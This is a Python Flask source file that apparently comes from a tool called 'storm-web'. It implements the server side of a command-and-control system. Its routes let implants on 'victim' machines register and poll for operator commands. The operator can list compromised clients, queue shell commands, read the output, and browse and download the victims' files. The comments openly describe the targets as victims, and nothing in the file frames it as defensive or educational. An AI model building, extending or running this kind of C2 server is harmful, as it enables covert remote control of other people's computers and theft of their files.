"""P3.2 part C - /api/c2/* (C2 implant + admin file manager).

Routes verbatim from storm-web/app.py:601-779 (lines moved at
extraction time).  See app/blueprints/capture.py for the package
documentation.  Since P5.3, C2 session/queue state lives behind the
shared ``app.state.STORE`` (StateStore, lock-guarded); response shapes
are frozen and enforced by tests/char.
"""
from __future__ import annotations

import os
from datetime import datetime

from flask import Blueprint, jsonify, request

import database as db

from app.state import BASE_DIR, STORE


bp = Blueprint("capture_c2", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


# ---------------------------------------------------------------------------
# Victim-side: implant polls / queues commands / returns responses.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/register', methods=['POST'])
def c2_register():
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    # P5.3: session state lives behind the shared StateStore
    STORE.c2_session_set(uid, info, request.remote_addr)

    # Persist so the client list survives a server restart
    db.save_c2_session(uid, info, request.remote_addr)

    return jsonify({'status': 'registered'})


@bp.route('/api/c2/poll', methods=['POST'])
def c2_poll():
    data = request.json
    uid = data.get('uid')

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    STORE.c2_session_update_last_seen(uid)  # no-op when uid unknown (legacy)

    db.update_c2_last_seen(uid)

    cmd = STORE.c2_command_dequeue(uid)
    if cmd is not None:
        return jsonify({'command': cmd})

    return jsonify({'command': None})


@bp.route('/api/c2/response', methods=['POST'])
def c2_response():
    data = request.json
    uid = data.get('uid')
    output = data.get('output')

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    STORE.c2_session_update_last_seen(uid)

    STORE.c2_response_append(uid, output, datetime.now().isoformat())

    return jsonify({'status': 'received'})


# ---------------------------------------------------------------------------
# Admin APIs: list clients, queue commands, stream responses.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/clients')
def c2_list_clients():
    active = []
    now = datetime.now()

    STORE.c2_sessions_import(db.get_all_c2_sessions())

    for uid, sess in STORE.c2_all_sessions().items():
        if not uid:
            continue
        try:
            last = datetime.fromisoformat(sess['last_seen'])
            delta = (now - last).total_seconds()
            status = 'online' if delta < 20 else 'offline'
        except Exception:
            status = 'offline'

        active.append({
            'uid': uid,
            'ip': sess['ip'],
            'info': sess['info'],
            'status': status,
            'last_seen': sess['last_seen']
        })
    return jsonify({'clients': active})


@bp.route('/api/c2/queue_command', methods=['POST'])
def c2_queue_command():
    data = request.json
    uid = data.get('uid')
    cmd = data.get('cmd')

    STORE.c2_command_enqueue(uid, cmd)
    return jsonify({'status': 'queued'})


@bp.route('/api/c2/get_responses/<uid>')
def c2_get_responses(uid):
    # stream semantics: drain returns everything and empties the queue
    return jsonify({'responses': STORE.c2_response_drain(uid)})


# ---------------------------------------------------------------------------
# File-manager endpoints (between victim implant and operator panel).
# C2_FILE_LISTS / C2_DOWNLOADS live behind app.state.STORE since P5.3.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/get_file_list/<uid>')
def c2_get_file_list(uid):
    file_data = STORE.c2_file_list_drain(uid)
    if file_data is not None:
        return jsonify(file_data)
    return jsonify({'files': None})


@bp.route('/api/c2/get_download/<uid>')
def c2_get_download(uid):
    file_data = STORE.c2_download_drain(uid)
    if file_data is not None:
        return jsonify(file_data)
    return jsonify({'file': None})


@bp.route('/api/c2/file_list_response', methods=['POST'])
def c2_file_list_response():
    """Victim sends file list back."""
    data = request.json
    uid = data.get('uid')
    files = data.get('files')
    path = data.get('path')

    if uid:
        STORE.c2_file_list_set(uid, {'files': files, 'path': path})

    return jsonify({'status': 'received'})


@bp.route('/api/c2/file_download_response', methods=['POST'])
def c2_file_download_response():
    """Victim sends file content back."""
    data = request.json
    uid = data.get('uid')
    content = data.get('content')
    filename = data.get('filename')

    if uid:
        STORE.c2_download_set(uid, {
            'file': {
                'content': content,
                'filename': filename
            }
        })

    return jsonify({'status': 'received'})
